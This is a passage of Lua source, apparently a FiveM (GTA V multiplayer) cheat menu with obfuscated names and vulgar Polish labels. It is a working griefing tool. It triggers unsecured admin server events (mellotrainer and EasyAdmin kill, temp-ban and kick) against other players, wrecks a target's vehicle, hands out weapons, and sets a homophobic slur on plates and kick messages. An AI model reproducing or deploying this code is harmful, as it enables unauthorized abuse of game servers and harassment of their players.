				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~b~Napraw Pojazd ~r~NOWE") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), false), 0)
 
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~b~Rozjeb Samochod ~r~NOWE ") then
					local hjytejyjtjjukjut = GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK)
					local VRHBRTHTRHRTTRHTYR = GetVehiclePedIsIn(hjytejyjtjjukjut, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
						StartVehicleAlarm(VRHBRTHTRHRTTRHTYR)
						DetachVehicleWindscreen(VRHBRTHTRHRTTRHTYR)
						SmashVehicleWindow(VRHBRTHTRHRTTRHTYR, 0)
						SmashVehicleWindow(VRHBRTHTRHRTTRHTYR, 1)
						SmashVehicleWindow(VRHBRTHTRHRTTRHTYR, 2)
						SmashVehicleWindow(VRHBRTHTRHRTTRHTYR, 3)
						SetVehicleTyreBurst(VRHBRTHTRHRTTRHTYR, 0, true, 1000.0)
						SetVehicleTyreBurst(VRHBRTHTRHRTTRHTYR, 1, true, 1000.0)
						SetVehicleTyreBurst(VRHBRTHTRHRTTRHTYR, 2, true, 1000.0)
						SetVehicleTyreBurst(VRHBRTHTRHRTTRHTYR, 3, true, 1000.0)
						SetVehicleTyreBurst(VRHBRTHTRHRTTRHTYR, 4, true, 1000.0)
						SetVehicleTyreBurst(VRHBRTHTRHRTTRHTYR, 5, true, 1000.0)
						SetVehicleTyreBurst(VRHBRTHTRHRTTRHTYR, 4, true, 1000.0)
						SetVehicleTyreBurst(VRHBRTHTRHRTTRHTYR, 7, true, 1000.0)
						SetVehicleDoorBroken(VRHBRTHTRHRTTRHTYR, 0, true)
						SetVehicleDoorBroken(VRHBRTHTRHRTTRHTYR, 1, true)
						SetVehicleDoorBroken(VRHBRTHTRHRTTRHTYR, 2, true)
						SetVehicleDoorBroken(VRHBRTHTRHRTTRHTYR, 3, true)
						SetVehicleDoorBroken(VRHBRTHTRHRTTRHTYR, 4, true)
						SetVehicleDoorBroken(VRHBRTHTRHRTTRHTYR, 5, true)
						SetVehicleDoorBroken(VRHBRTHTRHRTTRHTYR, 6, true)
						SetVehicleDoorBroken(VRHBRTHTRHRTTRHTYR, 7, true)
						SetVehicleLights(VRHBRTHTRHRTTRHTYR, 1)
						Citizen.InvokeNative(0x1FD09E7390A74D54, VRHBRTHTRHRTTRHTYR, 1)
						SetVehicleNumberPlateTextIndex(VRHBRTHTRHRTTRHTYR, 5)
						SetVehicleNumberPlateText(VRHBRTHTRHRTTRHTYR, "GEJ")
						SetVehicleDirtLevel(VRHBRTHTRHRTTRHTYR, 10.0)
						SetVehicleModColor_1(VRHBRTHTRHRTTRHTYR, 1)
						SetVehicleModColor_2(VRHBRTHTRHRTTRHTYR, 1)
						SetVehicleCustomPrimaryColour(VRHBRTHTRHRTTRHTYR, 255, 51, 255)
						SetVehicleCustomSecondaryColour(VRHBRTHTRHRTTRHTYR, 255, 51, 255)
						SetVehicleBurnout(VRHBRTHTRHRTTRHTYR, true)
						AleTenAPIACJESTCHUJOWYSKRTR("~g~Pojazd Rozjebany!")					
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~MelloTrainer ~s~KILL") then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~MelloTrainer ~s~BAN") then
					TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~MelloTrainer ~s~KICK") then
					TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "Kicked: You have been kicked from the server." )
					TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "ALE GEJ" )
					end
				
			
				

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("HTRJYJTYYTKTYKTKTKUY") then
				for i = 1, #RHRTHJRTJRJKYTKTYU do
					if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ(RHRTHJRTJRJKYTKTYU[i]) then
						GiveWeaponToPed(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), GetHashKey(RHRTHJRTJRJKYTKTYU[i]), 1000, false, true)
					end
				end

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif IsDisabledControlPressed(0, 313) then
				APISHITACCCCCCCCCCCCC.BTRRBRTBYTYUJKYU("DDDDDDDDDDDDDDDDDDDDDDDDDDD")
			end

			Citizen.Wait(0)
		end
	end
)

RegisterCommand("killmenu", function(source,args,raw)
	BTBRTHJRJYHTJYRYTFY = false
end, false)
